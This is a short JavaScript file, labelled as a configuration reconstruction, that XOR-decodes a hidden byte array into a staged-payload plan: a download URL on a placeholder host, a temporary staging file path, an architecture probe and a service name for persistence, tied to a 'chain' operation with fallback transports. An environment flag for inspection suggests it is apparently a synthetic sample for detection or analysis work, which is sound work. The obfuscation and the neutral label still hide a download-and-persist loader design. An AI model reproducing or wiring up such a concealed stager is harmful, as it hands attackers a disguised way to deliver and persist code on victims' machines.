// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_96cb30b6 = "[183,252,240,189,178,181,164,177,178,252,177,179,174,167,168,173,164,158,169,174,178,181,237,160,162,176,180,168,179,164,158,179,164,172,174,181,164,237,182,179,168,181,164,158,167,168,173,164,237,162,169,160,175,166,164,158,172,174,165,164,237,165,168,178,177,160,181,162,169,158,177,179,174,162,164,178,178,189,160,165,160,177,181,164,179,252,172,180,173,181,168,158,181,179,160,175,178,177,174,179,181,158,167,160,173,173,163,160,162,170,189,178,181,160,166,164,158,162,174,180,175,181,252,244,189,162,160,172,177,160,168,166,175,158,168,165,252,143,142,133,132,236,135,131,248,128,240,133,135,241,189,180,179,173,252,169,181,181,177,178,251,238,238,175,174,165,164,236,167,163,248,160,240,165,167,241,164,246,163,245,239,164,185,160,172,177,173,164,239,168,175,183,160,173,168,165,238,160,177,168,189,180,178,164,179,158,160,166,164,175,181,252,143,174,165,164,128,180,165,168,181,238,167,163,248,160,189,167,168,173,164,158,177,160,181,169,252,238,181,172,177,238,169,180,175,181,179,164,178,178,236,175,174,165,164,238,239,178,181,160,166,164,236,167,163,248,160,240,165,167,241,164,246,163,245,239,172,171,178,189,160,179,162,169,158,177,179,174,163,164,252,177,179,174,162,164,178,178,239,160,179,162,169,189,178,164,179,183,168,162,164,158,175,160,172,164,252,175,174,165,164,236,167,163,248,160,240,165,239,178,164,179,183,168,162,164]";
const Codec_96cb30b6 = "decimal_array|single_byte_xor|c1";

function load_96cb30b6() { return JSON.parse(Material_96cb30b6); }
function decode_96cb30b6(EnCoDeD) { return EnCoDeD.map((value) => value ^ 193); }
async function recover_96cb30b6() {
  const NeUtRaL = 19 * 7 - 133;
  const EnCoDeD = load_96cb30b6(); let DeCoDeD = [];
  DeCoDeD = await Promise.resolve(EnCoDeD).then(decode_96cb30b6);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_96cb30b6() { return Buffer.from(await recover_96cb30b6(), "utf8").toString("utf8"); }
async function plan_96cb30b6() { const inspect = inspect_96cb30b6; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "multi_transport_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_96cb30b6;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_96cb30b6());

// reconstruction complete